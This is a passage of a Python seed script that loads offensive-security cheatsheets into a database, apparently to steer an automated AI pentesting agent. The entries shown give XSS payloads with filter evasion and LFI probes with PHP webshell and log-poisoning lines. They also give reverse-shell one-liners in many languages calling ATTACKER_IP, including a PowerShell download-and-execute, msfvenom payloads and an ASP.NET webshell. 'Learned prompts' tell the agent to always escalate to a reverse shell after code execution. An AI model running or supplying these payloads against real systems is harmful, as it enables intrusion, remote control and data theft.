        "learned_prompt": "Detect ASP via .asp/.aspx URLs and ASP.NET_SessionId cookies. Run sqlmap with --dbms=mssql first, then wapiti -m sql,blindsql. Probe 'search', 'id', 'q', 'category' parameters. Verify with WAITFOR DELAY '0:0:10' for time-based confirmation. Never stop at single tool execution — chain at least 2 tools.",
        "affected_phases": ["P11", "P12", "P13", "P14"],
        "affected_skills": ["risk_assessment", "exploitation", "injection_battery"],
        "recommended_tools": ["sqlmap", "wapiti", "ghauri", "nuclei", "dalfox"],
        "learned_techniques": [
            {"name": "ASP/MSSQL boolean blind on search", "phase": "P11", "tool": "sqlmap"},
            {"name": "MSSQL union-based extraction", "phase": "P12", "tool": "sqlmap"},
            {"name": "MSSQL WAITFOR DELAY time-based", "phase": "P12", "tool": "sqlmap"},
            {"name": "MSSQL error-based via HAVING/CONVERT", "phase": "P12", "tool": "wapiti"},
            {"name": "MSSQL stacked queries + xp_cmdshell", "phase": "P14", "tool": "sqlmap"},
            {"name": "Auth bypass via ' OR 1=1--", "phase": "P11", "tool": "manual"},
            {"name": "WAF bypass with comment/case/hex", "phase": "P12", "tool": "sqlmap"},
        ],
    },
    # ─────────────────────────────────────────────────────────────────────
    # XSS — Context-based payloads + filter evasion (n0p.net mirror)
    # ─────────────────────────────────────────────────────────────────────
    {
        "title": "XSS Cheatsheet - Context-based payloads + filter evasion",
        "vulnerability_type": "Cross-Site Scripting",
        "source_kind": "vendor_cheatsheet",
        "source_urls": ["https://n0p.net/penguicon/php_app_sec/mirror/xss.html"],
        "summary": "Reflected, stored e DOM XSS com payloads por contexto (HTML body, atributo, JS string, URL, CSS). Inclui bypass de filtro via encoding, case, null-byte e tag fragmentada.",
        "steps_to_reproduce": """
PROBE INICIAL (canário):
  '';!--"<XSS>=&{()}
  Se aparecer '<XSS' no HTML (não escapado) há reflexão.

CONTEXT: HTML BODY
  <script>alert(1)</script>
  <img src=x onerror=alert(1)>
  <svg onload=alert(1)>
  <iframe src="javascript:alert(1)">
  <body onload=alert(1)>
  <details open ontoggle=alert(1)>
  <math><mtext></mtext><script>alert(1)</script></math>

CONTEXT: HTML ATTRIBUTE
  " onmouseover=alert(1) x="
  ' autofocus onfocus=alert(1) '
  " onerror=alert(1) src=x "
  javascript:alert(1)           (when injected into href)

CONTEXT: JS STRING (inside <script> var x='INPUT')
  '; alert(1); //
  \\'; alert(1); //
  </script><script>alert(1)</script>

CONTEXT: URL (href, src, action)
  javascript:alert(1)
  javasc&#9;ript:alert(1)
  data:text/html,<script>alert(1)</script>

CONTEXT: CSS (style attribute)
  expression(alert(1))           (IE legacy)
  background:url("javascript:alert(1)")

FILTER EVASION:
  Mixed case:               <ScRiPt>alert(1)</sCrIpT>
  Numeric HTML entities:    &#60;script&#62;alert(1)&#60;/script&#62;
  Hex entities:             &#x3C;script&#x3E;
  Zero padding:             &#0000060script&#0000062
  Tab inside scheme:        jav&#x09;ascript:alert(1)
  Newline inside scheme:    jav&#x0A;ascript:alert(1)
  Quote-broken src:         <SCRIPT a=">" SRC="//evil/x.js"></SCRIPT>
  Recursive-removal:        <scr<script>ipt>alert(1)</scr</script>ipt>

DOM XSS SINKS (search JS):
  document.location, document.URL, document.referrer
  innerHTML, outerHTML, document.write, eval, setTimeout
  jQuery: $('#x').html(input), $.parseHTML

AUTOMATION:
  dalfox url https://target/page --custom-payload payloads.txt --waf-evasion --silence
  dalfox file urls.txt --cookie "session=..." --output dalfox.txt
  XSStrike -u "https://target/page?q=FUZZ" --crawl --skip-poc
  kxss < params.txt
  Pulse JS: katana -u https://target -jc -kf all | grep "\\.js$" | httpx -silent | xargs -I@ curl -s @ | grep -E "(innerHTML|document\\.write|eval\\()"

EVIDENCE TO CAPTURE:
  - HTTP request + parameter reflected
  - DOM screenshot or alert() trigger
  - dalfox/XSStrike PoC URL
  - Response body showing unescaped payload
""",
        "impact": "Session hijack via cookie theft, credential phishing via injected forms, drive-by exploit chaining, ATO, defacement.",
        "remediation": "Output encode by context (HtmlEncoder.Default vs JavaScriptEncoder vs UrlEncoder). Apply strict CSP (default-src 'self'; script-src 'self'). HttpOnly + Secure + SameSite=Lax on session cookies. Validate URL schemes (allowlist http/https). Use trusted-types in modern browsers.",
        "learned_mission": "Para cada parâmetro refletido, identificar contexto (HTML body / attr / JS / URL / CSS) e escolher payload por contexto. Sempre rodar dalfox + XSStrike (ou nuclei xss templates) para triangular reflexão e DOM.",
        "learned_prompt": "Reflect canary '';!--\"<XSS>=&{()} first. Then context-specific payload. Always pair dalfox with a second tool (XSStrike, kxss, nuclei dast-xss) before promoting to finding.",
        "affected_phases": ["P12", "P13"],
        "affected_skills": ["risk_assessment", "exploitation", "injection_battery"],
        "recommended_tools": ["dalfox", "nuclei", "wapiti", "katana", "httpx"],
        "learned_techniques": [
            {"name": "Reflected XSS body context", "phase": "P12", "tool": "dalfox"},
            {"name": "Reflected XSS attribute context", "phase": "P12", "tool": "dalfox"},
            {"name": "DOM XSS sink discovery", "phase": "P12", "tool": "katana"},
            {"name": "Filter evasion (case/hex/tab)", "phase": "P12", "tool": "dalfox"},
            {"name": "Stored XSS hunt", "phase": "P13", "tool": "wapiti"},
        ],
    },
    # ─────────────────────────────────────────────────────────────────────
    # LFI / Path Traversal — highon.coffee cheatsheet
    # ─────────────────────────────────────────────────────────────────────
    {
        "title": "LFI / Path Traversal Cheatsheet (highon.coffee)",
        "vulnerability_type": "Local File Inclusion",
        "source_kind": "vendor_cheatsheet",
        "source_urls": ["https://highon.coffee/blog/lfi-cheat-sheet/"],
        "summary": "Local File Inclusion + path traversal: PHP wrappers (php://filter, php://input, expect://, data://), /proc/self/* targets para code-exec via headers, log poisoning, e bypass por null-byte. Inclui alvos Windows comuns.",
        "steps_to_reproduce": """
DISCOVERY (parâmetros candidatos):
  ?page=, ?file=, ?path=, ?include=, ?template=, ?lang=, ?view=, ?doc=

CANARY PROBES:
  /page.php?file=../../../../../../etc/passwd
  /page.php?file=....//....//....//etc/passwd     (dot-dot bypass)
  /page.php?file=..%2f..%2f..%2fetc%2fpasswd      (url-encode)
  /page.php?file=..%252f..%252fetc%252fpasswd     (double encode)
  /page.php?file=/etc/passwd%00                    (PHP <5.3.4 null byte)
  /page.php?file=/etc/passwd%2500
  /page.php?file=php://filter/convert.base64-encode/resource=index.php  (source disclosure)

PHP WRAPPERS:
  php://filter/convert.base64-encode/resource=../config.php
  php://filter/read=string.rot13/resource=index.php
  php://input            (POST body becomes file content — RCE if eval)
       POST body: <?php system('id'); ?>
  data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOz8+   (b64 of <?php system('id');?>)
  expect://id            (RCE if expect ext loaded)
  zip://shell.zip%23shell.php
  phar://image.jpg/payload.txt

PROC TARGETS (Linux):
  /proc/self/environ      (poison via User-Agent: <?php system($_GET[c]); ?>)
  /proc/self/cmdline
  /proc/self/status
  /proc/self/fd/0, fd/1, fd/2 ... fd/255
  /proc/version
  /proc/sched_debug

LOG POISONING:
  Inject in User-Agent: <?php system($_GET['cmd']); ?>
  Then include: /page.php?file=/var/log/apache2/access.log&cmd=id
  Other targets: /var/log/nginx/access.log, /var/log/auth.log,
                 /var/log/vsftpd.log, /var/log/exim/mainlog

SESSION POISONING (PHP):
  Inject payload in $_SESSION (any field reflected to session file)
  Include: /page.php?file=/var/lib/php/sessions/sess_<PHPSESSID>

WINDOWS TARGETS:
  ..\\..\\..\\..\\windows\\win.ini
  ..\\..\\..\\..\\boot.ini
  ..\\..\\..\\windows\\system32\\drivers\\etc\\hosts
  ..\\..\\..\\windows\\system32\\config\\sam
  C:\\inetpub\\wwwroot\\web.config         (ASP/IIS)
  C:\\Windows\\System32\\inetsrv\\config\\applicationHost.config

ASP.NET TARGETS (when LFI in IIS):
  /page.aspx?path=..\\..\\..\\web.config
  /page.aspx?path=..\\..\\Global.asax
  /page.aspx?path=..\\..\\bin\\<App>.dll    (then ILSpy/dotpeek for source)

AUTOMATION:
  fimap -u "https://target/page.php?file=index.php"
  liffy "https://target/page.php?file=index.php"
  wfuzz -c -w lfi-payloads.txt -u "https://target/page.php?file=FUZZ" --hc 404
  nuclei -u https://target -t http/vulnerabilities/generic/generic-lfi.yaml
  kadimus -u "https://target/page.php?file=FUZZ"

EVIDENCE TO CAPTURE:
  - HTTP request showing parameter and payload
  - Response containing /etc/passwd or web.config content
  - php://filter base64 output decoded to source
  - For log poisoning: PoC RCE via include of access.log
""",
        "impact": "Code execution via wrapper/log poisoning, source code disclosure (php://filter), credential theft via /etc/shadow attempt or web.config (IIS), lateral discovery via /proc enumeration.",
        "remediation": "Allowlist file names (basename + extension check). Never concatenate user input into include()/require(). Disable PHP wrappers via allow_url_include=0 and allow_url_fopen=0. Set open_basedir. Use a static dispatcher map (id -> file).",
        "learned_mission": "Identificar parâmetros tipo ?file= / ?page= / ?include=. Testar travessia simples, depois php://filter (b64), depois /proc/self/environ + User-Agent poison. Em IIS/ASP.NET tentar web.config e ..\\..\\bin\\<App>.dll.",
        "learned_prompt": "Probe ?file= and ?page= with ../../../../etc/passwd and php://filter/convert.base64-encode/resource=index.php. If PHP, try /proc/self/environ + UA poison. For Windows/IIS try web.config and applicationHost.config. Always pair fimap with nuclei generic-lfi template.",
        "affected_phases": ["P12", "P13"],
        "affected_skills": ["risk_assessment", "exploitation", "injection_battery"],
        "recommended_tools": ["fimap", "wfuzz", "ffuf", "nuclei", "kadimus", "wapiti"],
        "learned_techniques": [
            {"name": "Path traversal /etc/passwd", "phase": "P12", "tool": "fimap"},
            {"name": "php://filter source disclosure", "phase": "P12", "tool": "fimap"},
            {"name": "/proc/self/environ + UA poison", "phase": "P13", "tool": "manual"},
            {"name": "Log poisoning via access.log", "phase": "P13", "tool": "manual"},
            {"name": "IIS/ASP.NET web.config read", "phase": "P12", "tool": "ffuf"},
            {"name": "Null byte bypass", "phase": "P12", "tool": "wfuzz"},
        ],
    },
    # ─────────────────────────────────────────────────────────────────────
    # Reverse Shell one-liners (highon.coffee)
    # ─────────────────────────────────────────────────────────────────────
    {
        "title": "Reverse Shell One-Liners (highon.coffee)",
        "vulnerability_type": "Post-Exploitation",
        "source_kind": "vendor_cheatsheet",
        "source_urls": ["https://highon.coffee/blog/reverse-shell-cheat-sheet/"],
        "summary": "Reverse shell one-liners por linguagem/runtime: bash, python, perl, php, ruby, netcat (várias variantes), powershell, java, telnet, socat, node, awk, lua, msfvenom. Útil após RCE/LFI/SQLi+xp_cmdshell.",
        "steps_to_reproduce": """
ATTACKER LISTENER (escolha um):
  nc -lvnp 4444
  rlwrap nc -lvnp 4444            (history + arrow keys)
  socat -d -d TCP4-LISTEN:4444 STDOUT
  pwncat-cs -lp 4444              (modern handler)

BASH:
  bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
  0<&196;exec 196<>/dev/tcp/ATTACKER_IP/4444; sh <&196 >&196 2>&196
  bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'

PYTHON (3 most common):
  python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/bash")'
  python -c 'import os;os.system("bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1")'

PERL:
  perl -e 'use Socket;$i="ATTACKER_IP";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

PHP (one-line):
  php -r '$sock=fsockopen("ATTACKER_IP",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
  Embedded in webshell:
    <?php exec("/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'"); ?>

RUBY:
  ruby -rsocket -e 'f=TCPSocket.open("ATTACKER_IP",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

NETCAT:
  nc -e /bin/sh ATTACKER_IP 4444                       (only if -e supported)
  rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP 4444 >/tmp/f   (fifo)
  ncat ATTACKER_IP 4444 -e /bin/bash --ssl              (encrypted)

TELNET (when nc absent):
  mknod backpipe p && telnet ATTACKER_IP 4444 0<backpipe | /bin/bash 1>backpipe

POWERSHELL (Windows IIS / ASP.NET RCE):
  powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('ATTACKER_IP',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$sby=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sby,0,$sby.Length);$s.Flush()};$c.Close()"
  Short variant via downloader:
    powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/rs.ps1')"

JAVA:
  r = Runtime.getRuntime(); p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/ATTACKER_IP/4444;cat <&5 | while read line; do \\$line 2>&5 >&5; done"] as String[]); p.waitFor()

SOCAT (full TTY):
  attacker:  socat file:`tty`,raw,echo=0 tcp-listen:4444
  victim:    socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:ATTACKER_IP:4444

NODE.JS:
  require('child_process').exec('bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1')

AWK:
  awk 'BEGIN {s = "/inet/tcp/0/ATTACKER_IP/4444"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null

LUA:
  lua -e "require('socket');require('os');t=socket.tcp();t:connect('ATTACKER_IP',4444);os.execute('/bin/sh -i <&3 >&3 2>&3');"

MSFVENOM PAYLOADS:
  msfvenom -p linux/x86/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f elf -o shell
  msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f exe -o shell.exe
  msfvenom -p php/reverse_php LHOST=ATTACKER_IP LPORT=4444 -f raw -o shell.php
  msfvenom -p java/jsp_shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f raw -o shell.jsp

POST-CONNECT TTY UPGRADE:
  python3 -c 'import pty;pty.spawn("/bin/bash")'
  Ctrl+Z ; stty raw -echo ; fg ; export TERM=xterm

ASP.NET WEBSHELL (drop+exec):
  <%@ Page Language="C#" %><%System.Diagnostics.Process.Start("powershell.exe","-c \\"IEX(New-Object Net.WebClient).DownloadString('http://A/rs.ps1')\\"");%>
""",
        "impact": "Interactive shell on target, persistence staging, lateral pivot, data exfiltration. Required step for actions-on-objectives.",
        "remediation": "Egress filtering (block outbound to internet from server VLAN). EDR with reverse-shell heuristics. Disable bash for service accounts. AppLocker / SELinux confined daemons. Audit /proc/*/net/tcp.",
        "learned_mission": "Após confirmar RCE/RFI/xp_cmdshell, sempre escalar para shell reverso. Prefira python3 pty se python existir, senão bash /dev/tcp. Em Windows/IIS use powershell -nop -c. Sempre subir nc -lvnp 4444 ou pwncat-cs antes do PoC.",
        "learned_prompt": "After RCE primitive, drop a reverse shell. Match language to target: PHP→php -r, ASP.NET→powershell -nop, generic Linux→bash /dev/tcp. Upgrade TTY with python pty. Listener: rlwrap nc -lvnp 4444.",
        "affected_phases": ["P14", "P15", "P16"],
        "affected_skills": ["exploitation", "actions_on_objectives", "command_and_control"],
        "recommended_tools": ["nc", "ncat", "socat", "msfvenom", "pwncat-cs", "powershell"],
        "learned_techniques": [
            {"name": "Bash /dev/tcp reverse shell", "phase": "P14", "tool": "bash"},
            {"name": "Python pty reverse shell", "phase": "P14", "tool": "python3"},
            {"name": "PHP reverse one-liner", "phase": "P14", "tool": "php"},
            {"name": "Powershell reverse (Win/IIS)", "phase": "P14", "tool": "powershell"},
            {"name": "Netcat fifo reverse shell", "phase": "P14", "tool": "nc"},
            {"name": "MSFvenom multi-platform payload", "phase": "P14", "tool": "msfvenom"},
            {"name": "Full-TTY socat reverse", "phase": "P14", "tool": "socat"},
        ],
    },
    # ─────────────────────────────────────────────────────────────────────
    # Pentest tool command reference (pentestmindmap.com)
    # ─────────────────────────────────────────────────────────────────────
    {
        "title": "Pentest Tool Invocation Reference (pentestmindmap)",
        "vulnerability_type": "Methodology",
        "source_kind": "vendor_cheatsheet",
        "source_urls": ["https://pentestmindmap.com/cheatsheet"],
        "summary": "Comandos canônicos de execução para ferramentas Kali essenciais. Use como referência ao escolher invocações dentro de cada skill.",
        "steps_to_reproduce": """
NMAP (recon → vuln):
  nmap -sC -sV -oA scan TARGET                       (default scripts + version)
  nmap -p- -T4 -oA full TARGET                       (all ports, fast)
  nmap -sV --script=vuln -oA vuln TARGET             (NSE vuln scripts)
  nmap -sU --top-ports 50 TARGET                     (UDP top 50)

NIKTO (web misconfig):
  nikto -h https://TARGET -ask no -nointeractive -maxtime 600s -Tuning 123bde -Display V
  nikto -h https://TARGET -id user:pass -Cookies     (authenticated scan)
  nikto -h TARGET -port 8080,443                     (multi-port)
  Note: NÃO use -Format json sem -output FILE; sai com erro.

SQLMAP:
  sqlmap -u "https://T/page.asp?id=1" --dbms=mssql --batch --random-agent
  sqlmap -u "https://T/page.asp?id=1" --level=5 --risk=3 --technique=BEUSTQ --batch
  sqlmap -u "https://T/form" --data "search=test" --cookie "ASP.NET_SessionId=..." --batch
  sqlmap -r request.txt --batch --tamper=between,space2comment

GOBUSTER / FFUF / FEROXBUSTER (content discovery):
  gobuster dir -u https://T -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt -t 50 -x php,aspx,asp,html
  ffuf -u "https://T/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -fc 404 -ac
  ffuf -u "https://T/page.asp?FUZZ=test" -w params.txt -fs 1234     (param fuzz, filter size)
  feroxbuster -u https://T -w wordlist.txt -x asp,aspx -s 200,301,302

HYDRA / MEDUSA (brute):
  hydra -L users.txt -P passwords.txt ssh://TARGET -t 4 -o creds.txt
  hydra -L users.txt -P passwords.txt TARGET http-post-form "/login.asp:user=^USER^&pass=^PASS^:F=Invalid"
  medusa -h TARGET -U users.txt -P pass.txt -M smbnt -O medusa.log

WPSCAN (WordPress):
  wpscan --url https://T --enumerate u,vp,vt --api-token KEY
  wpscan --url https://T --usernames admin --passwords rockyou.txt

NUCLEI (templated DAST):
  nuclei -u https://T -severity critical,high,medium -rl 150 -silent
  nuclei -l hosts.txt -tags cve,exposure,misconfig -severity high,critical
  nuclei -u https://T -t http/vulnerabilities/generic/generic-lfi.yaml
  nuclei -u https://T -t http/cves/2023/                 (year-scoped CVEs)

DIRB / DIRSEARCH:
  dirb https://T /usr/share/wordlists/dirb/common.txt -S -w
  dirsearch -u https://T -e asp,aspx,php,html -t 50 -i 200,301

WFUZZ (param/header fuzz):
  wfuzz -c -w wordlist.txt --hc 404 "https://T/page.asp?FUZZ=test"
  wfuzz -c -w params.txt -H "X-Forwarded-For: FUZZ" --hc 200 https://T/admin

DNSENUM / DNSRECON:
  dnsenum --dnsserver 8.8.8.8 -f wordlist.txt TARGET
  dnsrecon -d TARGET -t std,brt,axfr -D wordlist.txt

THEHARVESTER (OSINT):
  theHarvester -d TARGET -b duckduckgo,crtsh,hackertarget,bing,otx -l 200

MASSCAN (fast port scan):
  masscan -p1-65535 --rate 5000 -e tun0 TARGET/24 -oG masscan.gnmap

SMBCLIENT / ENUM4LINUX:
  smbclient -L //TARGET -N                                (anonymous list)
  smbclient //TARGET/share -U guest%
  enum4linux -a TARGET
  crackmapexec smb TARGET -u users.txt -p passwords.txt

DALFOX / XSSTRIKE (XSS):
  dalfox url https://T/page?q=test --waf-evasion --silence
  dalfox file urls.txt --output dalfox.txt
  XSStrike -u "https://T/page?q=FUZZ" --crawl

WAPITI (web):
  wapiti -u https://T -m sql,blindsql,xss,exec,file,xxe,csrf -f json -o report.json

KATANA / GOSPIDER (crawl):
  katana -u https://T -d 10 -jc -kf all -aff -silent
  gospider -s https://T -c 20 -d 5 --sitemap --robots --js

INTERACTSH (OOB):
  interactsh-client -v                                    (gets unique callback domain)

CRACKMAPEXEC (AD):
  crackmapexec smb DC_IP -u user -p pass --shares
  crackmapexec winrm TARGET -u admin -H NTLM_HASH
""",
        "impact": "Reference only - enables correct tool invocation. Misuse (e.g. nikto -Format json without -output) causes silent failures.",
        "remediation": "n/a (reference).",
        "learned_mission": "Ao invocar uma ferramenta dentro de uma skill, consultar primeiro este reference. Para nikto, NUNCA usar -Format json sem -output. Para sqlmap em ASP, sempre fixar --dbms=mssql. Para hydra HTTP, montar a fail-string correta (F=Invalid).",
        "learned_prompt": "Use canonical command per tool. nikto needs -ask no -nointeractive -maxtime. sqlmap on ASP needs --dbms=mssql --batch. ffuf with -fc 404 -ac. nuclei with -severity flag. Hydra http-post-form needs explicit F=fail string.",
        "affected_phases": ["P02", "P03", "P11", "P12", "P13", "P14"],
        "affected_skills": ["asset_discovery", "risk_assessment", "exploitation", "tool_usage", "injection_battery"],
        "recommended_tools": [
            "nmap", "nikto", "sqlmap", "gobuster", "ffuf", "feroxbuster",
            "hydra", "wpscan", "nuclei", "dalfox", "wapiti", "katana",
            "interactsh-client", "crackmapexec", "wfuzz", "masscan", "smbclient",
        ],
        "learned_techniques": [
            {"name": "Nmap default+vuln scan", "phase": "P02", "tool": "nmap"},
            {"name": "Nikto safe invocation", "phase": "P12", "tool": "nikto"},
            {"name": "SQLmap MSSQL targeting", "phase": "P12", "tool": "sqlmap"},
            {"name": "FFUF content+param fuzzing", "phase": "P03", "tool": "ffuf"},
            {"name": "Nuclei templated DAST", "phase": "P12", "tool": "nuclei"},
            {"name": "Dalfox XSS automation", "phase": "P12", "tool": "dalfox"},
            {"name": "Hydra HTTP form brute", "phase": "P14", "tool": "hydra"},
            {"name": "Crackmapexec SMB enum", "phase": "P14", "tool": "crackmapexec"},
        ],
    },
]


def main():
    db = SessionLocal()
    inserted = 0
    skipped = 0
    try:
        for entry in LEARNINGS:
            existing = (
                db.query(VulnerabilityLearning)
                .filter(
                    VulnerabilityLearning.title == entry["title"],
                    VulnerabilityLearning.source_kind == entry["source_kind"],
                )
                .first()
            )
            if existing:
                skipped += 1
                continue

            techniques = entry.get("learned_techniques", [])
            rec = VulnerabilityLearning(
                owner_id=OWNER_ID,
                status="accepted",
                source_kind=entry["source_kind"],
                source_urls=entry.get("source_urls", []),
                url_count=len(entry.get("source_urls", [])),
                title=entry["title"],
                vulnerability_type=entry.get("vulnerability_type"),
                summary=entry.get("summary", ""),
                steps_to_reproduce=entry.get("steps_to_reproduce", ""),
                impact=entry.get("impact", ""),
                remediation=entry.get("remediation", ""),
                learned_mission=entry.get("learned_mission", ""),
                learned_prompt=entry.get("learned_prompt", ""),
                learned_techniques=techniques,
                technique_count=len(techniques),
                affected_phases=entry.get("affected_phases", []),
                affected_skills=entry.get("affected_skills", []),
                recommended_tools=entry.get("recommended_tools", []),
                raw_extraction={},
                llm_model="manual_seed_v1",
                accepted_by_id=OWNER_ID,
                accepted_at=datetime.utcnow(),
                created_at=datetime.utcnow(),
                updated_at=datetime.utcnow(),
            )
            db.add(rec)
            inserted += 1

        db.commit()
        print(f"✓ Inserted: {inserted} learnings | Skipped (already exist): {skipped}")
    except Exception as e:
        db.rollback()
        print(f"✗ Error: {e}")
        raise
    finally:
        db.close()


if __name__ == "__main__":
    main()
